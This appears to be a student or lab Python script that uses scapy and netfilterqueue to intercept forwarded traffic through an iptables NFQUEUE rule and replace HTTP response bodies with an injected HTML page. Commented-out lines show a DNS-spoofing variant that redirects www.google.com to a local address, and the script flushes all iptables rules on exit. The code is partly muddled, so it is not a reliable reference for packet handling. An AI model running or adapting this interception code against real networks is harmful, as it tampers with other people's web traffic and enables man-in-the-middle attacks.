
from scapy.all import * 
from scapy.layers.http import HTTPRequest, HTTPResponse
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    "www.google.com": "192.168.56.102" #b???
}

def processPkt(packet):
    scapyPktTCP = TCP(packet.get_payload())
    scapyPktIP = IP(packet.get_payload())
    scapyPktRaw = Raw(packet.get_payload())
    #scapyPktEther = Ether(packet.get_payload())
    if(scapyPktTCP.haslayer(TCP)):
        # print("yes TCP")
        # print(scapyPktIP.summary())
        # print(scapyPktIP.show2())
        # print(scapyPktTCP.summary())
        # print(scapyPktTCP.show2())
        # print(scapyPktRaw.show())
        if (scapyPktIP.haslayer(HTTPResponse)):
            print("yes http")
            scapyPktTCP = modifyPkt(scapyPktIP)
            #packet.set_payload(bytes(scapyPktIP))
            #packet.accept()
        packet.set_payload(bytes(scapyPktTCP))
    # else:
    #     print("After ", scapyPkt.summary())    
    packet.accept()

def modifyPkt(packet):
    print(packet[HTTPResponse].payload)
    dnsname = packet[HTTPResponse].payload
    packet[HTTPResponse].payload = '<html><body><h1>It does not work!</h1></body></html>'
    #print(packet)
    # if dnsname not in dns_hosts:
	#    print("no modification", dnsname)
	#    return packet
    # packet[DNS].an = DNSRR(rrname=dnsname, rdata = dns_hosts[dnsname])
    # packet[DNS].ancount = 1 #???
    del packet[IP].len
    del packet[IP].chksum
    # del packet[UDP].len    
    # del packet[UDP].chksum
    
    return packet

queueNum = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queueNum))
queue = NetfilterQueue()
#iptable is a firewall rules
try:
    queue.bind(queueNum, processPkt)
    print("yes1")
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
